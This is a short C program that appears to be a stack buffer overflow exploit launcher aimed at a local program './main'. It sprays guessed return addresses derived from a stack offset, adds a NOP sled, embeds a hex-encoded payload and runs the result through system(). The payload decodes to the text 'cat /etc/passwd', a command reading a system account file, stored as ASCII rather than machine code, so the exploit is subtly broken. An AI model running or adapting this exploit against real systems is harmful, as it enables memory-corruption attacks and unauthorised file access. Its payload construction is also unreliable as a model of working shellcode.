#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char code[] = "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

int main(int argc, char *argv[]) {
    unsigned int i, *ptr, ret, offset = 270;
    char *command, *buffer;

    command = (char *) malloc(200);
    bzero(command, 200);

    strcpy(command, "./main \'");
    buffer = command + strlen(command);

    if (argc > 1) {
        offset = atoi(argv[1]);
    }
    ret = (unsigned int) &i - offset;

    for (int j = 0; j < 160; j += 4) {
        *((unsigned int *) (buffer + j)) = ret;
    }
    memset(buffer, 0x90, 40);
    memcpy(buffer + 60, code, sizeof(code) - 1);

    strcat(command, "\'");
    system(command);
    free(command);

    return 0;
}